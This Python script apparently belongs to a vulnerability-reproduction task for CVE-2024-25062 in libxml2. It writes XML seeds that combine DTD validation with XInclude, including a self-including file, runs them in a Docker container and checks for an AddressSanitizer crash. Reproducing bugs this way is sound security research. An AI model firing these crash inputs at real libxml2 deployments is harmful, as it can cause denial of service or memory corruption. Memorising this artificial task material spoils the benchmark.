import os
import subprocess

# Common included file with its own DTD to pass recursive validation
VALID_INC_XML = """<?xml version="1.0"?>
<!DOCTYPE x [ <!ELEMENT x (#PCDATA)> ]>
<x>Valid Content</x>"""

# Text file for parse="text"
TEXT_INC = "Just text"

PATTERNS = {
    # 1. Backtrack with Valid XML Include
    "backtrack_valid": {
        "main": """<?xml version="1.0"?>
<!DOCTYPE root [
<!ELEMENT root (a | b | c)*>
<!ELEMENT a (#PCDATA)>
<!ELEMENT b (#PCDATA)>
<!ELEMENT c ANY>
<!ATTLIST root xmlns:xi CDATA #FIXED "http://www.w3.org/2001/XInclude">
<!ELEMENT xi:include EMPTY>
<!ATTLIST xi:include xmlns:xi CDATA #FIXED "http://www.w3.org/2001/XInclude">
<!ATTLIST xi:include href CDATA #REQUIRED>
]>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <a>first</a>
  <c>
    <xi:include href="inc_valid.xml"/>
  </c>
  <b>last</b>
</root>""",
        "inc": VALID_INC_XML,
        "inc_name": "inc_valid.xml"
    },
    
    # 2. Backtrack with Text Include (Avoids recursive DTD check entirely)
    "backtrack_text": {
        "main": """<?xml version="1.0"?>
<!DOCTYPE root [
<!ELEMENT root (a | b | c)*>
<!ELEMENT a (#PCDATA)>
<!ELEMENT b (#PCDATA)>
<!ELEMENT c ANY>
<!ATTLIST root xmlns:xi CDATA #FIXED "http://www.w3.org/2001/XInclude">
<!ELEMENT xi:include EMPTY>
<!ATTLIST xi:include xmlns:xi CDATA #FIXED "http://www.w3.org/2001/XInclude">
<!ATTLIST xi:include href CDATA #REQUIRED>
<!ATTLIST xi:include parse CDATA #REQUIRED>
]>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <a>first</a>
  <c>
    <xi:include href="inc_text.txt" parse="text"/>
  </c>
  <b>last</b>
</root>""",
        "inc": TEXT_INC,
        "inc_name": "inc_text.txt"
    },

    # 3. Recursive include (Self-include)
    "recursive_death": {
        "main": """<?xml version="1.0"?>
<!DOCTYPE root [
<!ELEMENT root (xi:include)>
<!ELEMENT xi:include EMPTY>
<!ATTLIST root xmlns:xi CDATA #FIXED "http://www.w3.org/2001/XInclude">
<!ATTLIST xi:include xmlns:xi CDATA #FIXED "http://www.w3.org/2001/XInclude">
<!ATTLIST xi:include href CDATA #REQUIRED>
]>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="seed_recursive.xml"/>
</root>""",
        # This will point to itself (seed_recursive.xml)
        "inc": "", 
        "inc_name": "dummy.txt" # Not used
    }
}

def run_test():
    for name, data in PATTERNS.items():
        print(f"\n>>> Testing Pattern: {name}")
        
        seed_filename = f"seed_{name}.xml"
        
        # Write seeds
        with open(f"tasks/CVE-2024-25062_libxml2/seeds/{seed_filename}", "w") as f:
            f.write(data["main"])
        
        if name != "recursive_death":
            with open(f"tasks/CVE-2024-25062_libxml2/seeds/{data['inc_name']}", "w") as f:
                f.write(data["inc"])
            
        # Run Docker
        cmd = f"docker compose -f tasks/CVE-2024-25062_libxml2/compose.yml run --rm target-vuln /seeds/{seed_filename}"
        try:
            res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            print("Exit Code:", res.returncode)
            if "AddressSanitizer" in res.stderr or "AddressSanitizer" in res.stdout:
                print("!!! CRASH DETECTED !!!")
                print(res.stderr[:500])
                return True
            else:
                print("Output snippet:")
                print(res.stderr[:300])
                # print(res.stdout[:200])
        except Exception as e:
            print(f"Error: {e}")

    return False

if __name__ == "__main__":
    run_test()
